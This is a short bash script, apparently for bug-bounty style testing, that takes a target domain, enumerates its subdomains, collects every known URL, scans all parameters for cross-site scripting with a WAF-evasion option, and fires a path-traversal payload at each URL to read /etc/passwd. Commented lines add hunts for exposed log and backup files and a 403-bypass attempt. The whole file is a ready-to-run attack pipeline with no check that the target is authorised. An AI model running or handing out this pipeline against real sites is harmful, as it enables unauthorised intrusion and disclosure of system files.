#!/bin/bash

#------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------# 
amass enum --passive -d $1 -o domains_$1
assetfinder --subs-only $1 | tee -a domains_$1

subfinder -d $1 -o domains_subfinder_$1
cat domains_subfinder_$1 | tee -a domains_$1

sort -u domains_$1 -o domains_$1
cat domains_$1 | filter-resolved | tee -a domains_$1.txt
#------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------# 

#subdomain takeonver
#filtro de sudominios online com httprobe

cat domains_$1 | gau --subs --threads 5 | tee allUrls.txt; 

#cat allUrls.txt | grep -i "\.log$" | tee log.txt;
#cat allUrls.txt | grep -i "\.bak$" | tee bak.txt;
#cat allUrls.txt | grep -i "\.xlsx$" | tee xlsx.txt;
#cat allUrls.txt | grep -i "\.js$" | tee jsfiles.txt;
#cat domains_$1 | grep -i "\.<>$" allUrls.txt | tee log.txt;

grep "=" allUrls.txt | tee allParams.txt; # Encontrar parametros que recebem algo
cat allParams.txt | dalfox file allParams.txt --waf-evasion | tee xsstest; # Encontrar parametros que refletem caracteres e possiveis xss
httpx -l allUrls.txt -path "/////////////../../../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt; # Validar Path Transversal


#httpx -l allUrls.txt -mc 403 | tee 403s.txt; # Encontrar arquivos/direorios que nao temos acesso para tentar bypass
#/home/kali/tools/403-bypass/403-bypass.py -U 403s.txt; # tentativa de bypass com outro script
